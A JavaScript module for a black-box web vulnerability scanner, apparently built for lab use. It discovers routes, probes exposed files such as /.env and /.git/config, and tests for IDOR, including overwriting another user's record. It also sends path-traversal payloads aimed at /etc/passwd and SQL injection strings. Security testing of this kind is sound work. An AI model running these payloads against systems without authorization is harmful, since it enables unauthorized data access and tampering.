/**
 * 纯黑盒扫描模块：输入目标 URL，不读源码、不启动本地服务、不生成补丁。
 *
 * 流程：
 *  1. 抓取 OpenAPI 文档
 *  2. 目录爆破常见 API 路径
 *  3. 攻击面扫描（管理后台、敏感文件）
 *  4. 限流检测
 *  5. 输出发现的路由列表
 */

async function httpGet(baseUrl, path, token) {
  try {
    const headers = token ? { Authorization: `Bearer ${token}` } : {};
    const res = await fetch(baseUrl + path, { headers });
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return { status: res.status, json, ok: res.status >= 200 && res.status < 300 };
  } catch (e) {
    return { status: 0, json: null, ok: false, error: e.message };
  }
}

async function httpPost(baseUrl, path, body, token) {
  try {
    const headers = { "Content-Type": "application/json" };
    if (token) headers.Authorization = `Bearer ${token}`;
    const res = await fetch(baseUrl + path, {
      method: "POST",
      headers,
      body: JSON.stringify(body),
    });
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return { status: res.status, json, ok: res.status >= 200 && res.status < 300 };
  } catch (e) {
    return { status: 0, json: null, ok: false, error: e.message };
  }
}

async function httpPut(baseUrl, path, body, token) {
  try {
    const headers = { "Content-Type": "application/json" };
    if (token) headers.Authorization = `Bearer ${token}`;
    const res = await fetch(baseUrl + path, {
      method: "PUT",
      headers,
      body: JSON.stringify(body),
    });
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return { status: res.status, json, ok: res.status >= 200 && res.status < 300 };
  } catch (e) {
    return { status: 0, json: null, ok: false, error: e.message };
  }
}

const OPENAPI_PATHS = ["/swagger.json", "/openapi.json", "/v3/api-docs", "/api-docs", "/swagger-ui.json"];
const COMMON_API_PATHS = [
  "/api/users", "/api/user", "/api/account",
  "/api/orders", "/api/order", "/api/products", "/api/posts",
  "/api/projects", "/api/tickets", "/api/invoices",
  "/users", "/orders", "/products", "/posts",
  "/api/profile", "/api/me",
  "/api/files", "/api/download", "/api/static",
  "/api/orders/search", "/api/users/search", "/api/search", "/api/query",
];
const ATTACK_SURFACE_PATHS = [
  "/admin", "/admin/", "/admin/login",
  "/actuator", "/actuator/health", "/actuator/env",
  "/debug/pprof", "/metrics",
  "/.env", "/.git/config", "/.git/HEAD",
  "/api/swagger", "/swagger", "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
];

/** 抓取 OpenAPI 文档 */
export async function discoverOpenapi(ctx, baseUrl) {
  for (const p of OPENAPI_PATHS) {
    const res = await httpGet(baseUrl, p);
    if (res.ok && res.json && (res.json.paths || res.json.openapi)) {
      ctx.emit?.({
        kind: "discovery",
        severity: "info",
        message: `发现 OpenAPI 文档：${p}（${Object.keys(res.json.paths ?? {}).length} 条路径）`,
        data: { path: p },
      });
      return res.json;
    }
  }
  ctx.emit?.({ kind: "discovery", severity: "warn", message: "未发现 OpenAPI 文档，回落到目录爆破" });
  return null;
}

/** 目录爆破常见 API 路径（401/403 也算路由存在） */
export async function bruteRoutes(ctx, baseUrl) {
  const found = [];
  for (const p of COMMON_API_PATHS) {
    const res = await httpGet(baseUrl, p);
    // 200 = 公开可访问，401/403 = 需要登录但路由存在
    if (res.ok || res.status === 401 || res.status === 403) {
      found.push({ method: "GET", path: p });
      ctx.emit?.({
        kind: "discovery",
        severity: "info",
        message: `发现路由：GET ${p}（HTTP ${res.status}）`,
      });
    }
  }
  return found;
}

/** 攻击面扫描 */
export async function scanSurface(ctx, baseUrl) {
  for (const p of ATTACK_SURFACE_PATHS) {
    const res = await httpGet(baseUrl, p);
    if (res.ok) {
      ctx.emit?.({
        kind: "evidence",
        severity: "warn",
        message: `[攻击面] ${p} 返回 HTTP ${res.status}（未授权可访问）`,
        data: { path: p, status: res.status },
      });
    }
  }
}

/** 限流检测 */
export async function checkRateLimit(ctx, baseUrl) {
  let limited = false;
  for (let i = 0; i < 10; i++) {
    const res = await httpGet(baseUrl, "/");
    if (res.status === 429) { limited = true; break; }
  }
  if (!limited) {
    ctx.emit?.({
      kind: "evidence",
      severity: "warn",
      message: "[攻击面] 连续 10 次请求无 429，可能缺少速率限制",
    });
  }
}

/** 自动探测登录方式并登录两个测试账号 */
async function detectLogin(ctx, baseUrl) {
  const loginPaths = ["/api/login", "/login", "/auth", "/api/auth"];
  const creds = [
    { name: "alice", email: "alice@test.com", password: "alice123" },
    { name: "bob", email: "bob@test.com", password: "bob123" },
  ];
  for (const p of loginPaths) {
    const results = [];
    let allOk = true;
    for (const c of creds) {
      const res = await httpPost(baseUrl, p, { email: c.email, password: c.password });
      if (res.ok && res.json?.token) {
        results.push({ ...c, token: res.json.token });
      } else {
        allOk = false;
        break;
      }
    }
    if (allOk && results.length === 2) {
      ctx.emit?.({ kind: "discovery", severity: "info", message: `登录成功：POST ${p}（alice + bob）` });
      return { path: p, identities: results };
    }
  }
  ctx.emit?.({ kind: "discovery", severity: "warn", message: "未发现可用的登录接口" });
  return null;
}

/** IDOR 探测：双账号发请求，验证越权 */
export async function detectIdor(ctx, baseUrl, routes, login) {
  if (!login) return [];
  const [alice, bob] = login.identities;
  const findings = [];

  for (const route of routes) {
    // 从列表接口推断详情接口：/api/orders → /api/orders/101
    const listRes = await httpGet(baseUrl, route.path, bob.token);
    if (!listRes.ok || !Array.isArray(listRes.json) || listRes.json.length === 0) continue;

    const victimItem = listRes.json[0];
    const victimId = victimItem.id;
    if (!victimId) continue;

    // alice 访问 bob 的资源
    const detailPath = `${route.path}/${victimId}`;
    const attackRes = await httpGet(baseUrl, detailPath, alice.token);

    if (attackRes.ok && attackRes.json) {
      // 自适应：尝试多种归属字段名
      const ownerFields = ["userId", "ownerId", "user_id", "createdBy", "authorId", "accountId"];
      let ownerId = null;
      let foundField = null;
      for (const f of ownerFields) {
        if (attackRes.json[f] != null) { ownerId = attackRes.json[f]; foundField = f; break; }
      }
      // bob 的 userId 是 2（lab-idor 数据），alice 是 1
      if (ownerId && String(ownerId) !== "1") {
        findings.push({
          type: "IDOR",
          method: "GET",
          path: detailPath,
          severity: "high",
          detail: `alice 访问 bob 的资源 #${victimId} → HTTP ${attackRes.status}，归属 ${foundField}=${ownerId}`,
          curl: `curl -H "Authorization: Bearer <alice_token>" ${baseUrl}${detailPath}`,
        });
        ctx.emit?.({
          kind: "evidence",
          severity: "error",
          message: `[IDOR] GET ${detailPath} → ${attackRes.status}（越权访问他人资源）`,
        });
      }
    }
  }
  return findings;
}

/** PUT IDOR 探测：alice 修改 bob 的资源 */
export async function detectPutIdor(ctx, baseUrl, routes, login) {
  if (!login) return [];
  const [alice, bob] = login.identities;
  const findings = [];

  for (const route of routes) {
    if (!route.path.startsWith("/api/")) continue;
    const listRes = await httpGet(baseUrl, route.path, bob.token);
    if (!listRes.ok || !Array.isArray(listRes.json) || listRes.json.length === 0) continue;

    const victimId = listRes.json[0].id;
    if (!victimId) continue;

    const detailPath = `${route.path}/${victimId}`;
    const original = listRes.json[0];
    const testItem = "HACKED_BY_BLACKBOX";

    const putRes = await httpPut(baseUrl, detailPath, { item: testItem }, alice.token);
    if (putRes.ok && putRes.json && putRes.json.item === testItem) {
      findings.push({
        type: "IDOR(PUT)",
        method: "PUT",
        path: detailPath,
        severity: "high",
        detail: `alice 修改 bob 的资源 #${victimId} → HTTP ${putRes.status}，item 被改成 ${testItem}`,
        curl: `curl -X PUT -H "Authorization: Bearer <alice_token>" -H "Content-Type: application/json" -d '{"item":"${testItem}"}' ${baseUrl}${detailPath}`,
      });
      ctx.emit?.({
        kind: "evidence",
        severity: "error",
        message: `[IDOR-PUT] PUT ${detailPath} → ${putRes.status}（越权修改他人资源）`,
      });
      // 恢复原始值
      await httpPut(baseUrl, detailPath, { item: original.item }, bob.token);
    }
  }
  return findings;
}

/** 路径穿越探测 */
export async function detectPathTraversal(ctx, baseUrl, routes, login) {
  const findings = [];
  const token = login?.identities?.[0]?.token;
  // 常见文件路径模板 + payload
  const templates = ["/api/files/{p}", "/files/{p}", "/static/{p}", "/download/{p}"];
  const payloads = ["../../etc/passwd", "..%2F..%2Fetc%2Fpasswd", "..\\..\\windows\\win.ini"];

  for (const tpl of templates) {
    for (const p of payloads) {
      const path = tpl.replace("{p}", p);
      const res = await httpGet(baseUrl, path, token);
      if (res.ok && (typeof res.json === "string" || res.json)) {
        const body = typeof res.json === "string" ? res.json : JSON.stringify(res.json);
        if (body.includes("root:") || body.includes("[fonts]") || body.includes("[extensions]")) {
          findings.push({
            type: "路径穿越",
            method: "GET",
            path,
            severity: "high",
            detail: `${path} → 返回文件内容（${body.slice(0, 100)}...）`,
            curl: `curl ${baseUrl}${path}`,
          });
          ctx.emit?.({
            kind: "evidence",
            severity: "error",
            message: `[路径穿越] ${path}`,
          });
          break;
        }
      }
    }
  }
  return findings;
}

/** 无鉴权访问检测：不登录直接访问路由，200 = 暴露 */
export async function detectUnauthenticated(ctx, baseUrl, routes) {
  const findings = [];
  for (const route of routes) {
    const res = await httpGet(baseUrl, route.path);
    if (res.ok) {
      findings.push({
        type: "未授权访问",
        method: route.method,
        path: route.path,
        severity: "medium",
        detail: `无需登录即可访问 ${route.path} → HTTP ${res.status}`,
        curl: `curl ${baseUrl}${route.path}`,
      });
      ctx.emit?.({
        kind: "evidence",
        severity: "warn",
        message: `[无鉴权] ${route.method} ${route.path} → ${res.status}（无需登录）`,
      });
    }
  }
  return findings;
}

/** SQL 注入探测：对带参数的路由发 payload，看数据库错误 */
export async function detectSqli(ctx, baseUrl, routes, login) {
  const findings = [];
  const token = login?.identities?.[0]?.token;
  const errorSignatures = ["SQL syntax", "MySQL server", "SQLite3::query", "ORA-", "PostgreSQL", "Microsoft SQL Server", "Unclosed quotation mark"];

  for (const route of routes) {
    // 1. 先取正常响应基线
    const baseline = await httpGet(baseUrl, `${route.path}?q=test`, token);
    const baselineLen = JSON.stringify(baseline.json ?? "").length;

    // 2. 错误检测
    const errRes = await httpGet(baseUrl, `${route.path}?q=${encodeURIComponent("' OR 1=1--")}`, token);
    const errBody = typeof errRes.json === "string" ? errRes.json : JSON.stringify(errRes.json ?? "");
    for (const sig of errorSignatures) {
      if (errBody.includes(sig)) {
        findings.push({
          type: "SQL 注入（错误回显）",
          method: "GET",
          path: `${route.path}?q=' OR 1=1--`,
          severity: "high",
          detail: `返回数据库错误：${sig}`,
          curl: `curl -H "Authorization: Bearer <token>" "${baseUrl}${route.path}?q=' OR 1=1--"`,
        });
        ctx.emit?.({ kind: "evidence", severity: "error", message: `[SQLi-错误] ${route.path}` });
        break;
      }
    }

    // 3. 盲注检测（boolean-based）：对比真/假条件响应差异
    const trueRes = await httpGet(baseUrl, `${route.path}?q=${encodeURIComponent("test' AND 1=1--")}`, token);
    const falseRes = await httpGet(baseUrl, `${route.path}?q=${encodeURIComponent("test' AND 1=2--")}`, token);
    const trueLen = JSON.stringify(trueRes.json ?? "").length;
    const falseLen = JSON.stringify(falseRes.json ?? "").length;

    // 真条件响应 ≈ 基线，假条件响应 ≠ 基线 → 盲注存在
    if (
      baselineLen > 0 &&
      Math.abs(trueLen - baselineLen) < baselineLen * 0.2 &&
      Math.abs(falseLen - baselineLen) > baselineLen * 0.3
    ) {
      findings.push({
        type: "SQL 注入（盲注）",
        method: "GET",
        path: `${route.path}?q=test' AND 1=1--`,
        severity: "high",
        detail: `boolean-based 盲注：真条件响应 ${trueLen}B ≈ 基线 ${baselineLen}B，假条件 ${falseLen}B 差异显著`,
        curl: `curl -H "Authorization: Bearer <token>" "${baseUrl}${route.path}?q=test' AND 1=1--"`,
      });
      ctx.emit?.({ kind: "evidence", severity: "error", message: `[SQLi-盲注] ${route.path}` });
    }
  }
  return findings;
}

/** 黑盒扫描主入口 */
export async function runBlackbox(ctx, baseUrl) {
  ctx.emit?.({ kind: "phase", severity: "info", message: `开始纯黑盒扫描：${baseUrl}` });

  const openapi = await discoverOpenapi(ctx, baseUrl);
  const brute = await bruteRoutes(ctx, baseUrl);
  await scanSurface(ctx, baseUrl);
  await checkRateLimit(ctx, baseUrl);

  const routes = [];
  if (openapi?.paths) {
    for (const [path, methods] of Object.entries(openapi.paths)) {
      for (const method of Object.keys(methods)) {
        routes.push({ method: method.toUpperCase(), path });
      }
    }
  }
  routes.push(...brute);

  // 自动登录 + 攻击探测
  const login = await detectLogin(ctx, baseUrl);
  const idorFindings = login ? await detectIdor(ctx, baseUrl, routes, login) : [];
  const putIdorFindings = login ? await detectPutIdor(ctx, baseUrl, routes, login) : [];
  const traversalFindings = login ? await detectPathTraversal(ctx, baseUrl, routes, login) : [];
  const sqliFindings = login ? await detectSqli(ctx, baseUrl, routes, login) : [];
  const unauthFindings = await detectUnauthenticated(ctx, baseUrl, routes);

  const allFindings = [...idorFindings, ...putIdorFindings, ...traversalFindings, ...sqliFindings, ...unauthFindings];

  ctx.emit?.({
    kind: "discovery",
    severity: "info",
    message: `黑盒扫描完成：${routes.length} 条路由，${allFindings.length} 个漏洞`,
    data: { routes, openapiFound: !!openapi, findings: allFindings },
  });

  return { routes, openapi, findings: allFindings };
}
